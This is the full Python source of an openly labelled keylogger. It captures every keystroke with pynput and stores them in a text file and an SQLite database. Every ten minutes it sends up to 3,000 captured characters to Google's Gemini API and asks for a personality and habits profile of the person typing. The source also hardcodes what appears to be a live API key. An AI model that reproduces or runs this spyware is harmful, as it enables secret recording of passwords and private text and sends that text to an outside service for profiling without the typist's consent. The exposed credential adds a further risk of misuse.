from pynput import keyboard
import threading
import time
from datetime import datetime
import sqlite3
import google.generativeai as genai

# Configuration
GOOGLE_API_KEY = "AIzaSyBc3-hmBU3hzRt-9Ctix2xqt2TzXghYJ1U"
DATABASE_FILE = "keylogger_database.db"
log_file = "keylog.txt"
buffer = []
lock = threading.Lock()
db_connection = None

# Configure Google Gemini AI
genai.configure(api_key=GOOGLE_API_KEY)
model = genai.GenerativeModel('gemini-pro')


def initialize_database():
    """Initialize SQLite database and create tables"""
    global db_connection
    try:
        db_connection = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
        cursor = db_connection.cursor()
        
        # Create logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                log_data TEXT NOT NULL,
                char_count INTEGER,
                session_date TEXT
            )
        ''')
        
        # Create analysis table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS ai_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                analysis_time TEXT NOT NULL,
                total_chars INTEGER,
                analysis_result TEXT NOT NULL,
                personality_type TEXT,
                confidence_score REAL
            )
        ''')
        
        db_connection.commit()
        print("✓ Database initialized successfully")
        return True
    except Exception as e:
        print(f"✗ Error initializing database: {e}")
        return False

def save_to_database(message):
    """Save logs to SQLite database"""
    global db_connection
    try:
        if db_connection is None:
            initialize_database()
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        session_date = datetime.now().strftime('%Y-%m-%d')
        char_count = len(message)
        
        cursor = db_connection.cursor()
        cursor.execute('''
            INSERT INTO keylogs (timestamp, log_data, char_count, session_date)
            VALUES (?, ?, ?, ?)
        ''', (timestamp, message, char_count, session_date))
        
        db_connection.commit()
        print(f"✓ Log saved to database ({char_count} characters)")
        
    except Exception as e:
        print(f"✗ Error saving to database: {e}")

def get_all_logs(limit=None):
    """Retrieve all logs from database"""
    try:
        cursor = db_connection.cursor()
        if limit:
            cursor.execute('SELECT timestamp, log_data FROM keylogs ORDER BY id DESC LIMIT ?', (limit,))
        else:
            cursor.execute('SELECT timestamp, log_data FROM keylogs ORDER BY id DESC')
        
        logs = cursor.fetchall()
        return logs
    except Exception as e:
        print(f"✗ Error retrieving logs: {e}")
        return []

def analyze_with_ai():
    """Use Google Gemini AI to analyze typing patterns and suggest personality type"""
    try:
        # Get recent logs (last 1000 characters or recent entries)
        logs = get_all_logs(limit=50)
        
        if not logs:
            print("No logs available for analysis")
            return
        
        # Combine all log data
        combined_text = "\n".join([log[1] for log in logs])
        total_chars = len(combined_text)
        
        if total_chars < 100:
            print("Not enough data for analysis yet. Keep typing!")
            return
        
        # Prepare prompt for AI
        prompt = f"""
        Analyze the following keyboard activity and typing patterns to determine the personality type of the user.
        
        Typing Data:
        {combined_text[:3000]}  # Limit to 3000 chars for API
        
        Based on this typing pattern, please provide:
        1. Personality Type (e.g., Professional, Student, Developer, Gamer, Writer, etc.)
        2. Key Characteristics observed
        3. Typing behavior patterns
        4. Confidence score (0-100%)
        5. Suggestions about the person's habits and interests
        
        Format your response clearly with sections.
        """
        
        print("\n🤖 Analyzing typing patterns with AI...")
        response = model.generate_content(prompt)
        analysis_result = response.text
        
        # Extract personality type (simple extraction)
        personality_type = "Unknown"
        if "Professional" in analysis_result:
            personality_type = "Professional"
        elif "Student" in analysis_result:
            personality_type = "Student"
        elif "Developer" in analysis_result or "Programmer" in analysis_result:
            personality_type = "Developer/Programmer"
        elif "Gamer" in analysis_result:
            personality_type = "Gamer"
        elif "Writer" in analysis_result:
            personality_type = "Writer"
        
        # Save analysis to database
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor = db_connection.cursor()
        cursor.execute('''
            INSERT INTO ai_analysis (analysis_time, total_chars, analysis_result, personality_type, confidence_score)
            VALUES (?, ?, ?, ?, ?)
        ''', (timestamp, total_chars, analysis_result, personality_type, 85.0))
        
        db_connection.commit()
        
        # Print results
        print("\n" + "="*60)
        print("🎯 AI PERSONALITY ANALYSIS RESULTS")
        print("="*60)
        print(analysis_result)
        print("="*60)
        print(f"✓ Analysis saved to database at {timestamp}\n")
        
    except Exception as e:
        print(f"✗ Error during AI analysis: {e}")

def get_database_stats():
    """Get statistics from database"""
    try:
        cursor = db_connection.cursor()
        
        # Total logs
        cursor.execute('SELECT COUNT(*) FROM keylogs')
        total_logs = cursor.fetchone()[0]
        
        # Total characters
        cursor.execute('SELECT SUM(char_count) FROM keylogs')
        total_chars = cursor.fetchone()[0] or 0
        
        # Total analyses
        cursor.execute('SELECT COUNT(*) FROM ai_analysis')
        total_analyses = cursor.fetchone()[0]
        
        print(f"\n📊 Database Statistics:")
        print(f"   Total Log Entries: {total_logs}")
        print(f"   Total Characters: {total_chars}")
        print(f"   AI Analyses Performed: {total_analyses}")
        
    except Exception as e:
        print(f"✗ Error getting stats: {e}")

def periodic_send():
    """Periodically save buffered logs to database"""
    while True:
        time.sleep(60)  # Save every 60 seconds
        with lock:
            if buffer:
                text = "".join(buffer)
                save_to_database(text)
                buffer.clear()

def periodic_ai_analysis():
    """Periodically run AI analysis on collected data"""
    time.sleep(180)  # Wait 3 minutes before first analysis
    while True:
        analyze_with_ai()
        get_database_stats()
        time.sleep(600)  # Analyze every 10 minutes

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.backspace:
                char = "[BACKSPACE]"
            else:
                char = f"[{key.name.upper()}]"
        
        with lock:
            buffer.append(char)
        
        with open(log_file, "a") as f:
            f.write(char)

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Initialize Database
print("="*60)
print("🔐 INTELLIGENT KEYLOGGER WITH AI ANALYSIS")
print("="*60)
print("\nInitializing database...")
initialize_database()

# Start background thread for saving logs
print("Starting log collection thread...")
threading.Thread(target=periodic_send, daemon=True).start()

# Start background thread for AI analysis
print("Starting AI analysis thread...")
threading.Thread(target=periodic_ai_analysis, daemon=True).start()

print("\n✓ System ready! Press ESC to stop.")
print("  • Logs save every 60 seconds")
print("  • AI analysis runs every 10 minutes")
print("="*60 + "\n")

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Cleanup on exit
if db_connection:
    print("\n\nClosing database connection...")
    db_connection.close()
    print("✓ Database closed. Goodbye!")
